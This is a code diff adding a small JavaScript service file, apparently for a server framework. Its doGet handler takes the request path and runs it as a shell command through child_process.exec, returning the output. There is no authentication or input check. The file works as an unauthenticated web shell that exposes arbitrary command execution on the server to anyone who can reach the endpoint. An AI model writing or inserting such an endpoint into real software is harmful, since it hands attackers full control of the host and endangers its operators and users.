@@ -1,0 +1,16 @@
+{
+	doGet : {
+		async : true,
+		parameters : [ ],
+		method : function(request, response, callback) {
+			// Execute the process
+			var that = this;	// Arg, scope.
+			var command = request.getPathInfo();
+			command = command.substring(1, command.length);
+			require('child_process').exec(command, function(error, stdout, stderr){
+				response.getWriter().write(stdout);
+				that.serviceComplete(request, response, callback);
+			});
+		}
+	}
+}
